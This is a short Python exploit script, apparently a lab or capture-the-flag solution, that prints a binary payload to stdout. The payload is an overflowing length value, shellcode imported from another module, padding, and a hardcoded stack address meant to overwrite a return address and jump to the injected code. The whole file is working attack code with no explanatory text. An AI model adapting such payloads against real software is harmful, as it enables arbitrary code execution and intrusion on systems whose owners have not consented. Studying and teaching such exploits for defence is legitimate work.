#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(0x8000000000000001.to_bytes(8, 'little'))

sys.stdout.buffer.write(shellcode)

sys.stdout.buffer.write(b'\xff'*18)

sys.stdout.buffer.write(0x7ffffff6cda0.to_bytes(8, 'little'))